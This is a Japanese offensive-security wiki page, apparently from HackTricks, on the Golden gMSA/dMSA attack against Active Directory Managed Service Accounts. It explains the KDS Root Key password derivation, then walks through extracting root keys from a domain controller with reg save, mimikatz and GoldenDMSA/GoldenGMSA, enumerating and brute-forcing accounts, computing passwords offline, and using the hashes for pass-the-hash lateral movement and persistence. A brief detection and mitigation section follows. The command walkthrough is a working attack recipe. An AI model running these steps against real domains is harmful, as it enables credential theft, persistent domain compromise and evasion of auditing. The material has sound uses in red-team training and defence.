# Golden gMSA/dMSA Attack (Managed Service Account パスワードのオフライン導出)

{{#include ../../banners/hacktricks-training.md}}

## 概要

Windows Managed Service Accounts（MSA）は、パスワードを手動で管理せずにサービスを実行するために設計された特殊な principal です。
主に次の2種類があります。

1. **gMSA** – group Managed Service Account – `msDS-GroupMSAMembership` 属性で認可された複数のホスト上で使用できます。
2. **dMSA** – delegated Managed Service Account – gMSA の（preview）後継であり、同じ暗号方式に依存しながら、より細かな delegation シナリオに対応します。

どちらの variant でも、**パスワードは**通常の NT-hash のように各 Domain Controller（DC）上へ**保存されません**。代わりに、すべての DC が次の要素から現在のパスワードをオンザフライで**導出**できます。

* forest 全体の **KDS Root Key**（`KRBTGT\KDS`） – ランダムに生成された GUID 名の secret で、`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` コンテナ配下で各 DC に複製されます。
* 対象アカウントの **SID**。
* `msDS-ManagedPasswordId` 属性にある、アカウントごとの **ManagedPasswordID**（GUID）。

導出処理は `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte の blob で、最終的に **base64-encoded** され、`msDS-ManagedPassword` 属性に保存されます。
通常のパスワード利用時に Kerberos traffic や domain interaction は必要ありません。member host が3つの入力値を把握していれば、パスワードをローカルで導出できます。

## Golden gMSA / Golden dMSA Attack

攻撃者が3つの入力値をすべて**オフライン**で取得できる場合、DC に再度アクセスすることなく、forest 内の**任意の gMSA/dMSA に対する有効な現在および将来のパスワード**を計算できます。これにより、次の制限を回避できます。<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals（事前計算が可能）

これは service accounts 向けの *Golden Ticket* に相当します。<sup>[[1]](#references)[[2]](#references)</sup>

### 前提条件

1. **1台の DC**（または Enterprise Admin）に対する **forest-level compromise**、または forest 内のいずれかの DC に対する `SYSTEM` access。
2. service accounts を列挙する能力（LDAP read / RID brute-force）。
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) または同等の code を実行するための .NET ≥ 4.7.2 x64 workstation。<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – KDS Root Key の抽出

任意の DC から dump します（Volume Shadow Copy / raw SAM+SECURITY hives または remote secrets）。<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey`（GUID 名）としてラベル付けされた base64 string は、後の手順で必要です。<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – gMSA / dMSA objects の列挙

少なくとも `sAMAccountName`、`objectSid`、`msDS-ManagedPasswordId` を取得します。<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています：<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – ManagedPasswordID の推測 / 発見（欠落している場合）

一部の deployment では、ACL で保護された読み取りから `msDS-ManagedPasswordId` が *strip* されます。  
GUID は 128-bit であるため、単純な bruteforce は現実的ではありません。しかし、

1. 最初の **32 bits = アカウント作成時の Unix epoch time**（分単位の精度）。
2. その後に 96 個のランダム bits が続きます。

したがって、**アカウントごとの狭い wordlist**（± 数時間）は現実的です。
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
このツールは候補パスワードを計算し、その base64 blob を実際の `msDS-ManagedPassword` 属性と比較します。一致すれば、正しい GUID が判明します。

##### Phase 4 – オフラインでのパスワード計算と変換

ManagedPasswordID が判明すれば、有効なパスワードはあと 1 コマンドで取得できます:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
生成された hash は **mimikatz**（`sekurlsa::pth`）または Kerberos abuse 用の **Rubeus** で注入でき、ステルス性の高い **lateral movement** と **persistence** が可能になります。

## 検知と緩和策

* **DC backup and registry hive read** の機能を Tier-0 管理者に限定する。
* DC 上での **Directory Services Restore Mode (DSRM)** または **Volume Shadow Copy** の作成を監視する。
* `CN=Master Root Keys,…` の読み取り / 変更、およびサービスアカウントの `userAccountControl` フラグを監査する。
* 通常とは異なる **base64 password writes**、またはホスト間でのサービスパスワードの突然の再利用を検知する。
* Tier-0 isolation が不可能な場合は、高権限 gMSA を **classic service accounts** に変換し、定期的にランダムなパスワードをローテーションすることを検討する。

## ツール

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – このページで使用している reference implementation。<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – このページで使用している reference implementation。
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`、`sekurlsa::pth`、`kerberos::ptt`。
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – derived AES keys を使用した pass-the-ticket。

## 参考文献

- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
